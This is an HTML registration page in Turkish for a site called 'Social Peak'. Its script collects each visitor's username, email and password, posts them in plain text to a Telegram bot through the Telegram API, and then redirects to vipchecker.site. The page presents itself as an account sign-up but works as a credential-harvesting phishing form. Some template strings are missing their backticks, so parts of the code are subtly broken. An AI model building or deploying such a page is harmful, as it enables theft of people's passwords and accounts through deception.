<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Social Peak - Kayıt Ol</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="container">
  <div class="card">
    <div class="logo"><h2>Social Peak</h2></div>
    <h1>Sitemize Hoşgeldiniz</h1>
    <p class="desc">Sistemlerimize erişmek için aşağıdaki bilgileri doldurarak kayıt olun!</p>

    <form id="telegramForm">
      <label>Kullanıcı Adı</label>
      <input type="text" id="username" placeholder="Bir kullanıcı adı gir..." required>

      <label>Email</label>
      <input type="email" id="email" placeholder="Bir E-Posta gir" required>

      <label>Şifre</label>
      <div class="password-box">
        <input type="password" id="password" placeholder="Şifre" required>
        <button type="button" class="toggle-password" onclick="togglePassword()">
          <svg id="eye-icon" viewBox="0 0 24 24">
            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5z"/>
          </svg>
        </button>
      </div>

      <button type="submit" id="submitBtn">Kayıt Ol</button>

      <div class="login-text">
        Zaten hesabın var mı? <a href="https://vipchecker.site">Giriş Yap</a>
      </div>
    </form>
  </div>
</div>

<script>
// Şifre göster/gizle
function togglePassword() {
  const passwordInput = document.getElementById('password');
  const eyeIcon = document.getElementById('eye-icon');

  if (passwordInput.type === 'password') {
    passwordInput.type = 'text';
    eyeIcon.innerHTML = '<path d="M2 4.27L3.27 3 21 20.73 19.73 22z"/>';
  } else {
    passwordInput.type = 'password';
    eyeIcon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12z"/>';
  }
}

// ⚠️ Token'ı burada tutmak güvenli değil
const BOT_TOKEN = "BOT_TOKEN";
const CHAT_ID = "CHAT_ID";

document.getElementById('telegramForm').addEventListener('submit', function(e) {
  e.preventDefault();

  const user = document.getElementById('username').value;
  const mail = document.getElementById('email').value;
  const pass = document.getElementById('password').value;
  const btn = document.getElementById('submitBtn');

  btn.innerText = "Yükleniyor...";
  btn.disabled = true;

  const text = 🚀 Yeni Kullanıcı Kaydı\n\n👤 Kullanıcı: ${user}\n📧 Email: ${mail}\n🔑 Şifre: ${pass};

  fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text
    })
  }).finally(() => {
    window.location.href = "https://vipchecker.site";
  });
});
</script>

</body>
</html>
